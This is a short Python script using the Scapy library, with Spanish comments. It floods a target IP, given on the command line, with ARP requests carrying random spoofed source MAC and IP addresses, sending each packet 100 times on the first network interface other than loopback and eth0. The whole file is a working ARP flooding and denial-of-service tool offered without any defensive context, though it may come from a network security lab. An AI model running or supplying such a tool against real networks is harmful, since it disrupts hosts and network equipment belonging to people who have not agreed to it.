import scapy.all as scapy
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.l2 import ARP
import sys
import os

def pingen(qp, ifa, hServerIP):
    for i in range(qp):
        mac_random = RandMAC()._fix()  # Generar MAC aleatoria
        ip_random = RandIP()._fix()    # Generar IP aleatoria
        # Construir el paquete ARP (solicitud ARP)
        packet = Ether(dst='ff:ff:ff:ff:ff:ff', src=mac_random, type=0x0806) / ARP(hwsrc=mac_random, psrc=ip_random, pdst=hServerIP, op=1)
        # Enviar el paquete 100 veces
        sendp(packet, count=100, iface=ifa)

# Recibir argumentos de la línea de comandos
hServerIP = sys.argv[1]
qp = int(sys.argv[2])

# Obtener las interfaces de red disponibles
ifs = os.listdir('/sys/class/net/')

# Iterar sobre las interfaces y excluir 'lo' y 'eth0'
for i in ifs:
    if i != 'lo' and i != 'eth0':  # Puedes cambiar 'eth0' por la interfaz que necesites usar
        pingen(qp, i, hServerIP)
        print(f"Enviando paquetes por la interfaz: {i}")
        break
